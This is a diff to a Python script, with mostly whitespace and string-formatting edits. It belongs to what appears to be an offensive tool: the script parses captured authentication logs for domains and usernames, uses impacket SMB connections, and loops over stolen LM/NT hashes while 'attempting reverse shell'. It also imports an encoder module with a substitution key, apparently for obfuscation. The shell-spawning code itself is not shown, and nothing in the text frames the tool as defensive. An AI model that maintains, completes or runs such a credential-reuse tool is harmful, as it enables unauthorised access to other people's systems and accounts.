@@ -1,9 +1,12 @@
 import argparse
 import io
+
 import lazyencoder_decoder as ed
+
 shift_value = 3
 substitution_key = "clave"
 from impacket.smbconnection import SMBConnection
+
 
 def parse_hash_file(file_path):
     print(f"Parsing hash file: {file_path}")
@@ -19,7 +22,7 @@ def parse_hash_file(file_path):
 
                 if 'authenticated successfully' in line:
                     parts = line.split()
-                    user_info = parts[2] 
+                    user_info = parts[2]
                     domain, username = user_info.split('\\')
                     print(f"Extracted domain: {domain}, username: {username}")
 
@@ -119,7 +122,7 @@ if __name__ == "__main__":
     else:
         print(f"Valid credentials found: {credentials}")
         for username, domain, lmhash, nthash in credentials:
-            print(f"\nAttempting reverse shell with:")
+            print("\nAttempting reverse shell with:")
             print(f"  Username: {username}")
             print(f"  Domain: {domain}")
             print(f"  LMHash: {lmhash}")
